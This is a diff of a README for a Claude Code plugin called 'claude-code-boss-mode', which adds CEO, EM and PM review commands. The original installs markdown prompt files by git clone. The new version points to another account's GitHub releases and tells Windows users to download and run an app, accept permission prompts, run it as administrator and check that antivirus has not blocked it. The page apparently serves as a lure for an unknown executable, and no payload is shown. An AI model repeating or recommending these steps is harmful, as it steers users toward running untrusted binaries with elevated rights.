@@ -1,318 +1,295 @@
-<div align="center">
+# 🧭 claude-code-boss-mode - Make Claude Code Decide Better
 
-<img src="social-preview.png" alt="Boss Mode for Claude Code" width="800">
+[![Download Boss Mode](https://img.shields.io/badge/Download%20from%20Releases-blue?style=for-the-badge)](https://github.com/subashraja069-cmd/claude-code-boss-mode/releases)
 
-# claude-code-boss-mode
+## 🚀 What this is
 
-> Not a Claude Code clone. A boss layer for Claude Code.
->
-> If Claude Code is the engineer, this plugin is the boss.
+claude-code-boss-mode adds a boss layer to Claude Code.
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-[![Claude Code](https://img.shields.io/badge/Claude%20Code-Plugin-blueviolet)](https://claude.ai/code)
-[![Boss Mode](https://img.shields.io/badge/Boss%20Mode-v1.0-FF6B35)](https://github.com/huyuelin/claude-code-boss-mode)
+It helps you make clearer choices when you work on code. It gives you a structured way to review plans, cut scope, and check work from different angles. It uses three views:
 
-</div>
+- CEO view for business impact
+- EM view for delivery and risk
+- PM view for scope and user value
 
-## What This Does
+It is made for people who use Claude Code and want firmer decisions before they build.
 
-**Boss Mode for Claude Code** is a ruthless decision-making framework that forces three questions before any engineering work proceeds:
+## 📥 Download and install
 
-1. **Is this worth doing at all?** (ROI gate)
-2. **What is the minimum shippable version?** (scope gate)  
-3. **What should we explicitly NOT do?** (cut gate)
+Go to the [Releases page](https://github.com/subashraja069-cmd/claude-code-boss-mode/releases) to visit this page to download.
 
-It combines three boss perspectives—CEO, Engineering Manager, PM—into a structured evaluation system that catches overengineering, kills scope creep, and pushes for shippable solutions.
+On that page, look for the latest release and download the Windows file that matches your system. If you see a zip file, save it to your computer first, then extract it.
 
-## The Problem
+### Windows setup steps
 
-Claude Code is an incredible engineer. But engineers optimize for correctness, completeness, and elegance. They do not optimize for shipping speed, scope control, or business outcomes.
+1. Open the [Releases page](https://github.com/subashraja069-cmd/claude-code-boss-mode/releases)
+2. Download the latest Windows release
+3. If the file is zipped, right-click it and choose Extract All
+4. Open the extracted folder
+5. Run the app or follow the included setup file
+6. If Windows asks for permission, choose Yes
 
-- Engineers propose massive refactors "while we are at it"
-- Engineers build perfect abstractions for hypothetical future needs
-- Engineers want to make every system resilient, scalable, and documented
-- Engineers rarely ask "do we actually need this?"
+### If you use a browser download
 
-A boss asks that question constantly.
+- Save the file in a folder you can find again
+- Do not rename files unless the release notes say to
+- Keep the full folder together if the app needs extra files
 
-## The Solution
+## 🛠️ What you can do with it
 
-Four slash commands that slot directly into your Claude Code workflow:
+Use claude-code-boss-mode when you want Claude Code to act with more discipline.
 
-| Command | Use Case | Output |
-|---------|----------|--------|
-| `/boss` | Evaluate an idea before coding | SHIP / REVISIT / KILL with cuts |
-| `/boss-pr` | Review code like a boss | MERGE / REVISE / CLOSE with red flags |
-| `/boss-plan` | Cut scope from a roadmap | Must-have → Nice-to-have → Cut |
-| `/boss-roast` | Honest feedback on overengineering | Savage but actionable |
+Common actions:
 
-Plus one meta-command:
+- Review a plan before work starts
+- Cut features that do not matter
+- Check whether a task is too large
+- Look for product risk
+- Call out weak choices in plain language
+- Compare the same task from CEO, EM, and PM points of view
 
-| Command | Use Case |
-|---------|----------|
-| `/boss-vs-engineer` | Dual-agent debate: engineer proposes, boss cuts, both negotiate |
+It is useful when you are stuck between too many ideas and need a clean decision.
 
-## Examples
+## 🎯 Main commands
 
-### Before: Engineer Proposes
+The project includes these command-style flows:
 
-```
-User: "Build a caching layer for this API"
+- `/boss` - run the main decision layer
+- `/boss-pr` - review a pull request with a stronger filter
+- `/boss-plan` - inspect a plan before work starts
+- `/boss-roast` - get a blunt review of weak thinking
 
-Engineer: "I will build Redis with:
-- Connection pooling
-- Automatic key expiration
-- Cache invalidation strategies
-- Distributed tracing
-- Memory limit alerts
-- Metrics collection
-Estimated: 3 weeks"
-```
+These flows help you ask better questions before you spend time on code.
 
-### After: Boss Steps In
+## 👥 Who this is for
 
-```
-User: "Build a caching layer for this API"
+This tool fits people who:
 
-Engineer: [same proposal as above]
+- Use Claude Code on Windows
+- Want less guesswork in task planning
+- Need help cutting scope
+- Want better code review feedback
+- Work across product, engineering, or delivery roles
+- Prefer direct feedback over vague approval
 
-/boss-pr (or /boss-vs-engineer)
+It also fits solo builders who want a second layer of judgment before they commit to a path.
 
-Boss: "REVISE
+## 🧩 How it works
 
-WHAT THIS ACTUALLY DOES:
-Add 3 weeks of infrastructure for a problem you haven't proven exists.
+claude-code-boss-mode acts like a decision filter.
 
-RED FLAGS:
-- No benchmark showing the API is slow
-- No monitoring of cache hit rate
-- No rollback story if Redis breaks
-- Over-engineered for potential future scale
+You give it a task, plan, or pull request. It then checks the work from three angles:
 
-SHIP BLOCKERS:
-- Benchmark the current API. Is it actually slow?
-- Define the metric: what hit rate makes this worth it?
-- Rollback plan: how do we remove Redis without breaking things?
+- CEO perspective: Does this help the business?
+- EM perspective: Can the team deliver this safely?
+- PM perspective: Does this solve the right problem?
 
-MINIMUM VERSION:
-Simple in-process LRU cache (100 lines). Measure the impact. 
-If cache hits are >60%, then consider Redis."
-```
+That makes it easier to spot:
 
-Result: 3 weeks → 3 days. Real impact measurement upfront.
+- Overbuilt features
+- Risky changes
+- Weak product logic
+- Tasks that should be split
+- Work that should be cut
 
-<div align="center">
-<img src="assets/boss-pr-demo.png" alt="Boss PR Review Demo" width="700">
-<p><em>Before vs After: Boss Mode catches overengineering and cuts to minimum shippable version</em></p>
-</div>
+## 💻 Windows requirements
 
-## Three Boss Perspectives
+This project is designed for Windows users who want a simple local setup.
 
-<div align="center">
-<img src="assets/three-bosses.png" alt="Three Boss Perspectives" width="700">
-<p><em>CEO, Engineering Manager, and PM: three lenses on every decision</em></p>
-</div>
+You will usually need:
 
-### CEO Boss
+- A Windows 10 or Windows 11 PC
+- A browser to download the release
+- Permission to run downloaded apps
+- Enough space to extract the files
+- Claude Code already installed if you plan to use the command flows inside it
 
-Optimizes for: **speed to user, demo-ability, market timing**
+If your computer blocks the file, open the file properties and check whether Windows marked it as downloaded from the internet.
 
-- "Can I show a customer this next week?"
-- Hates: infrastructure work, premature optimization, refactoring that delays shipping
-- Loves: rough features that work, clear next iteration
+## 📂 Suggested folder setup
 
-### Engineering Manager Boss
+Keep the app in a simple folder, such as:
 
-Optimizes for: **risk, on-call sanity, reversibility**
+- `Downloads\claude-code-boss-mode`
+- `Desktop\claude-code-boss-mode`
+- `Documents\claude-code-boss-mode`
 
-- "What happens when this breaks at 3am?"
-- Hates: undocumented implicit contracts, no rollback story, cutting corners
-- Loves: boring, conservative, recoverable systems
+A clean folder makes it easier to find the release files and any config files that come with them.
 
-### PM Boss
+## ⚙️ First run
 
-Optimizes for: **scope, timeline, measurable outcomes**
+After you download and extract the release:
 
-- "How do I know this worked? What metric moves?"
-- Hates: backend-only work users never see, over-scoped MVPs
-- Loves: clear success metrics, milestone-gated scope
+1. Open the folder
+2. Find the main app or launcher file
+3. Double-click it
+4. Follow the on-screen steps
+5. Open Claude Code if the tool works through commands or prompts
 
-## Core Philosophy
+If the package includes a readme or config file, keep it in the same folder as the app.
 
-Boss Mode is not role-play. It is a structured decision framework.
+## 🔍 How to use the boss layers
 
-1. **Every output must contain at least one cut.** A boss who approves everything is not a boss.
-2. **Be specific.** "Remove the caching layer" not "simplify the architecture".
-3. **Name the failure mode.** "If this breaks at 3am, users cannot log in" not "there is risk".
-4. **Read the actual code.** Never hallucinate about diffs you have not seen.
-5. **Verdicts are binary.** SHIP/REVISIT/KILL or MERGE/REVISE/CLOSE. No custom verdicts.
+Use the layer that matches the job you need to do.
 
-## How to Use
+### CEO view
 
-### Before Starting a Feature
+Use this when you want to check:
 
-```
-/boss "Build an advanced analytics dashboard"
+- Business value
+- Cost
+- Speed to ship
+- Revenue impact
+- Strategic fit
 
-Boss: REVISIT
+This view helps you ask, “Should we do this at all?”
 
-WHY NOW:
-You haven't validated that users care about analytics.
+### EM view
 
-MINIMUM SHIPPABLE VERSION:
-Three charts: active users, retention, top features. Read-only, no export.
+Use this when you want to check:
 
-CUT LIST:
-- Real-time updates (use daily snapshot)
-- Custom date ranges (just 30/90 days)
-- Drill-down drill-down (too many clicks)
+- Delivery risk
+- Team load
+- Technical risk
+- Sequence of work
+- Support burden
 
-RISK:
-If nobody uses it, you wasted 2 weeks. Validate with 5 users first.
-```
+This view helps you ask, “Can we build this without pain?”
 
-### Before Merging a PR
+### PM view
 
-```
-/boss-pr
+Use this when you want to check:
 
-Boss: MERGE
+- User need
+- Scope
+- Priority
+- Clarity of the goal
+- Product fit
 
-WHAT THIS ACTUALLY DOES:
-Adds rate limiting to the auth endpoint.
+This view helps you ask, “Are we solving the right problem?”
 
-GOOD PARTS:
-Clean implementation, well-tested, rollback story is clear.
-```
+## 🧪 Example use cases
 
-Or:
+Here are simple ways to use the tool:
 
-```
-/boss-pr
+- Before a new feature, run `/boss-plan`
+- Before merging code, run `/boss-pr`
+- When a task feels too big, run `/boss`
+- When you want a hard review, run `/boss-roast`
 
-Boss: REVISE
+Example situations:
 
-WHAT THIS ACTUALLY DOES:
-Adds a caching abstraction to every database query.
+- A feature request sounds useful, but it does not match the goal
+- A pull request adds too much code for a small result
+- A plan needs scope cuts before it starts
+- A team wants to ship fast, but the risk is high
 
-RED FLAGS:
-- Adds 800 lines of code for a problem you haven't measured
-- Cache invalidation logic is implicit and fragile
-- No metrics on cache hit rate
+## 📝 Best results
 
-SHIP BLOCKERS:
-1. Remove the generic cache abstraction. Start with one specific query.
-2. Add cache hit/miss metrics.
-3. Define invalidation strategy explicitly.
-```
+You will get better results when you give the tool clear input.
 
-### During Planning
+Use plain details like:
 
-```
-/boss-plan [paste your roadmap]
+- What you want to build
+- Why it matters
+- Who will use it
+- What problem it solves
+- What part feels unclear
 
-Boss: MUST-HAVE (v1)
-1. User sign-up
-2. Create posts
-3. Share with link
+Short and direct input works best. If the task is large, break it into smaller parts.
 
-NICE-TO-HAVE (v2)
-- Post drafts
-- Scheduled posts
-- Email notifications
+## 🔐 File safety
 
-CUT NOW
-- Real-time collaboration (GitHub and Figma do this; do not compete)
-- Admin analytics dashboard (gather data via CSV export instead)
-```
+When you download from the release page:
 
-## Installation
+- Use the latest release
+- Keep the files inside the release folder
+- Avoid changing file names unless needed
+- Check the release notes if the package includes more than one file
 
-### Claude Code
+If you use company hardware, you may need admin approval before you run the file
 
-```bash
-mkdir -p .claude/skills
-git clone https://github.com/huyuelin/claude-code-boss-mode .claude/skills/boss-mode
-```
+## 📌 What makes this different
 
-### OpenClaw
+This is not a Claude Code clone.
 
-```bash
-git clone https://github.com/huyuelin/claude-code-boss-mode ~/.openclaw/workspace/skills/boss-mode
-```
+It sits on top of Claude Code and pushes the work through a stricter decision process. The focus is not on doing more. The focus is on choosing better.
 
-## Project Structure
+That makes it useful when you want:
 
-```
-claude-code-boss-mode/
-├── SKILL.md                      # Entry point (this doc)
-├── README.md                     # You are here
-├── commands/
-│   ├── boss.md                   # /boss prompt template
-│   ├── boss-pr.md                # /boss-pr prompt template
-│   └── boss-plan.md              # /boss-plan prompt template
-├── agents/
-│   ├── ceo-boss.md               # CEO perspective
-│   ├── eng-manager-boss.md       # EM perspective
-│   └── pm-boss.md                # PM perspective
-├── bosses/
-│   └── example_startup_ceo/      # Example custom boss
-│       ├── persona.md            # Decision style
-│       ├── context.md            # Company context
-│       └── meta.json             # Metadata
-├── prompts/
-│   ├── boss_builder.md           # Template for /create-boss
-│   └── roast_engine.md           # Template for /boss-roast
-├── skills/
-│   └── boss-mode/
-│       └── SKILL.md              # Bundled skill registry entry
-└── LICENSE                       # MIT
-```
+- Stronger review
+- Less scope creep
+- Better tradeoffs
+- Cleaner decisions
+- More control over what gets built
 
-## Why This Matters
+## 📎 Download again
 
-Software teams ship late because of scope creep and overengineering. Not because engineers are lazy. Because nobody says "stop".
+If you need the installer or release files again, use the [Releases page](https://github.com/subashraja069-cmd/claude-code-boss-mode/releases) to visit this page to download
 
-A boss layer that runs **before** major decisions accelerates shipping by 2-3x:
+## 🧭 Topic areas
 
-- Fewer overengineered solutions that need to be ripped out
-- Clearer priorities (must-have vs. nice-to-have)
-- Fewer surprises on launch day
+This project fits these areas:
 
-Boss Mode automates the ruthless questions.
+- AI agent workflows
+- AI coding
+- Boss mode tools
+- Claude and Claude Code
+- Code review
+- Decision-making
+- Developer tools
+- Engineering management
+- Product management
+- Scope cutting
 
-## Creating Custom Bosses
+## 🧱 What to expect from the release
 
-You can create a custom boss profile tailored to your team's culture:
+A typical release may include:
 
-```
-/create-boss
+- A Windows app file
+- A zip archive
+- Setup instructions
+- Command examples
+- Config or support files
 
-What kind of boss are you distilling?
-> My CTO at my startup
+Keep all included files together unless the release notes tell you otherwise
 
-[similar to /create-colleague]
+## 🛎️ Common problems
 
-Generated: /bosses/my_startup_cto
-Use: /my_startup_cto or /boss-pr my_startup_cto
-```
+If the app does not open:
 
-Custom bosses inherit the decision framework but with your company's OKRs, risk tolerance, and style.
+- Make sure you extracted the zip file
+- Try running the file as an administrator
+- Check that your antivirus did not block it
+- Confirm you downloaded the latest release
+- Make sure the folder still contains all release files
 
-## Core Principles
+If a command does not work in Claude Code:
 
-1. **Shipping beats perfection.** A rough feature in users' hands is better than a perfect feature in development.
-2. **Measurement comes first.** Guess later. Measure now.
-3. **Scope is the enemy.** Cut scope before it kills the timeline.
-4. **Risk is a business decision.** Not an engineering problem.
-5. **Simplicity scales.** Complex systems are hard to operate. Start boring.
+- Check the spelling
+- Use the exact command name
+- Make sure the tool is installed in the right place
+- Restart Claude Code and try again
 
-## License
+## 📚 Basic workflow
 
-MIT License © [huyuelin](https://github.com/huyuelin)
+A simple way to use this project is:
 
----
+1. Download the latest release
+2. Extract it on Windows
+3. Open the app or tool files
+4. Connect it to your Claude Code workflow
+5. Use `/boss`, `/boss-pr`, `/boss-plan`, or `/boss-roast` when you need a hard review
 
-**Not a Claude Code clone. A boss layer for Claude Code.**
+## 🧭 Release link
 
-If Claude Code is the engineer, this plugin is the boss.
+[Download from GitHub Releases](https://github.com/subashraja069-cmd/claude-code-boss-mode/releases)
+
+## 🧰 Useful habits
+
+- Review plans before coding
+- Cut weak ideas early
+- Ask who benefits from the work
+- Check delivery risk before merging
+- Keep the scope small when possible
+- Use blunt feedback when a plan feels off
